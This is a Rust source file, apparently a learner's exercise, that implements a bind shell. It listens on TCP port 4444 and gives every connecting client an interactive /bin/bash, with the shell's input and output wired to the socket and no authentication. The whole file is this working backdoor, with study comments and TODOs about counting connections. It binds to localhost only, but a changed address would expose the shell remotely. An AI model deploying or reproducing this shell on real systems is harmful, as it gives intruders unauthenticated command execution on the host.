use std::net::{TcpStream, TcpListener};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use std::thread;

//function to handle incoming tcp connections
fn handle_client(stream: TcpStream) {
    let fd = stream.as_raw_fd(); // tcpstream object as raw file descriptor

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait() //by calling wait(), this thread will wait for the shell to finish (be terminated); wait() does not need to be called for all commands it would seem
        .unwrap();
    
    //add a command here to subtract 1 from the number of current connections
    //you will have to find a way to move that variable across namespaces, and also make sure it is atomic
    //maybe look into a go-style approach and create a thread to monitor the number of connections?
}

fn main() {
    let listener = TcpListener::bind("127.0.0.1:4444").expect("Cannot bind to port 4444. Is something using it?"); // ? means try; basically a quick way of returning the Ok value in the case of Ok, and the Err value in case of Err (on Result enums)
    println!("Listening on port 4444...");

    // A really great example of how to handle Result Err with match; however in this case we just want to panic
    // match listener {
    //     Ok(v) => v,
    //     Err(e) => e,
    // };

    let mut num_connections = 0;

    for stream in listener.incoming() {
        let stream = stream.expect("An error occurred trying to handle an incoming connection");
        
        //announce the new connection, then start a thread to handle it
        println!("New connection from {}; Current connections: {}", stream.peer_addr().unwrap(), num_connections);
        thread::spawn(|| {
            handle_client(stream); // handle the incoming connection, move these to new threads once ready
        });
        //break; //optional break will stop the listener after the first connection
        num_connections += 1;
    }
}
